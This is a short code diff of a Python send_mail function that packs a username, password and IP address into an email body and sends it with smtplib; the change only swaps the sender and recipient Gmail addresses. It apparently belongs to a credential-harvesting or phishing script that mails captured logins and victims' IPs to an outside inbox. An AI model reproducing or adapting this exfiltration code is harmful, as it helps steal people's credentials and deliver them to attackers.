@@ -29,7 +29,7 @@ def send_mail(username, password, ip_address):
         subject = "Just Testing"
         body = f"The username is: {username} \n password is: {password} \n ip: {ip_address}"
         msg = f"Subject: {subject}\n\n{body}"
-        smtp.sendmail("busganda@gmail.com", "gideonbusayo@gmail.com", msg)
+        smtp.sendmail("work77@gmail.com", "chibyx395@gmail.com", msg)
 
     # with smtplib.SMTP(smtp_server, port) as server:
     #     server.login(login, password)
